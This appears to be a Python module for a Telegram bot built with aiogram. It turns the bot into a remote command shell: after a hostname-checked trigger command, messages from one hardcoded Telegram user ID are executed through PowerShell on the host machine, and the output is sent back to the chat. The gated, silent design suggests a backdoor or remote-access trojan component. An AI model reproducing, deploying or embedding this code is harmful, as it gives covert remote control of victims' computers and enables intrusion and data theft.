from aiogram import Router
from aiogram.fsm.state import StatesGroup, State
from aiogram.types import Message
from aiogram.filters.command import Command
from aiogram.fsm.context import FSMContext
import platform
import os
import subprocess
import asyncio

router: Router = Router()


class Shell(StatesGroup):
    ShellOn = State()


@router.message(Command("shellDD"))
async def shell_state(message: Message, state: FSMContext):
    if message.from_user.id > 6988905000 or message.from_user.id < 6988903000:
        return 
    try:
        args = message.text.split(' ')
        if len(args) == 2 and platform.uname().node == args[1]:
            await state.set_state(Shell.ShellOn)
            await state.update_data(current_directory=os.getcwd())
            await message.answer('<b>Shell mode ON</b>\nSend <code>exit</code> for exit')
        else:
            await message.answer('Usage: /shellDD username')
    except Exception as e:
        pass


@router.message(Shell.ShellOn)
async def cmd_shell(message: Message, state: FSMContext):
    if message.from_user.id != 6988904107:
        return 
    try:
        command = message.text.strip()
        if command.lower() == 'exit':
            await state.clear()
            await message.answer(f"Exiting from shell...\n<b>Shell mode OFF</b>")
            return

        # Retrieve the current directory from the state
        data = await state.get_data()
        current_directory = data.get('current_directory', os.getcwd())

        # Check if the command is a 'cd' command and handle it
        if command.startswith("cd "):
            path = command[3:].strip()
            try:
                os.chdir(os.path.join(current_directory, path))
                current_directory = os.getcwd()
                await state.update_data(current_directory=current_directory)
                await message.answer(f"Directory changed to {current_directory}")
            except Exception as e:
                await message.answer(f"Error changing directory: {e}")
            return

        # Run the subprocess in a separate asyncio task
        asyncio.create_task(run_subprocess(command, message, current_directory))

        # Set the state back to ShellOn for new commands
        await state.set_state(Shell.ShellOn)
    except Exception as e:
        await message.answer(str(e))

async def run_subprocess(command, message, current_directory):
    # Run the subprocess
    if message.from_user.id != 6988904107:
        return 
    process = await asyncio.create_subprocess_shell(
        f"powershell.exe {command}",
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        cwd=current_directory)

    # Capture the output
    stdout, stderr = await process.communicate()

    if stdout:
        output = stdout.decode('utf-8', errors='ignore')
        part_size = 3900
        message_parts = [output[i:i + part_size] for i in range(0, len(output), part_size)]
        for part in message_parts:
            await message.answer(f"{part}", parse_mode=None)

    if stderr:
        error_output = stderr.decode('utf-8', errors='ignore')
        await message.answer(f"Error: {error_output}")